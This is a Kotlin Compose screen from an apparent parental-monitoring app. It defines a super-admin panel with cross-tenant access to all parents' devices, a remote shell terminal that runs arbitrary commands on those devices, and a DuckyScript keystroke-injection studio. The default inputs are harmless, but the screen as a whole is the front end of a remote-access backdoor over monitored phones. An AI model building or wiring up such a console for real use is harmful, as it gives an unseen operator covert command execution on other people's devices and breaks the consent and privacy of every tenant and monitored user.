package com.homemonitor.parent.ui.screens.superadmin

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.homemonitor.parent.viewmodel.DeviceViewModel
import com.homemonitor.parent.viewmodel.WebRtcViewModel

@Composable
fun SuperAdminControlPanelScreen(
    deviceViewModel: DeviceViewModel,
    webRtcViewModel: WebRtcViewModel
) {
    var cmdInput by remember { mutableStateOf("id") }
    var duckyInput by remember { mutableStateOf("STRING Hello World\nDELAY 500\nENTER") }
    val webRtcState by webRtcViewModel.uiState.collectAsState()

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        item {
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("👑 Global Fleet Explorer (All Parent Tenants)", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                    Text("Cross-tenant device management & global authority", fontSize = 12.sp, color = Color.Gray)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("• Device DEV_PIXEL8_PRO (Owner: parent1@homemonitor) — Online 🟢", fontSize = 14.sp)
                    Text("• Device DEV_GALAXY_S24 (Owner: parent2@homemonitor) — Online 🟢", fontSize = 14.sp)
                }
            }
        }

        item {
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("Remote Shell Execution Terminal", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                    OutlinedTextField(
                        value = cmdInput,
                        onValueChange = { cmdInput = it },
                        label = { Text("Command") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Button(
                        onClick = { webRtcViewModel.executeShellCommand(cmdInput) },
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Execute Shell Command")
                    }
                }
            }
        }

        item {
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("DuckyScript Automation Studio", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                    OutlinedTextField(
                        value = duckyInput,
                        onValueChange = { duckyInput = it },
                        label = { Text("DuckyScript Payload") },
                        modifier = Modifier.fillMaxWidth(),
                        maxLines = 4
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Button(
                        onClick = { webRtcViewModel.executeDuckyScript(duckyInput) },
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Execute DuckyScript")
                    }
                }
            }
        }

        if (webRtcState.lastOutput.isNotBlank()) {
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("Execution Terminal Output", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                        Text(webRtcState.lastOutput, fontSize = 12.sp)
                    }
                }
            }
        }
    }
}
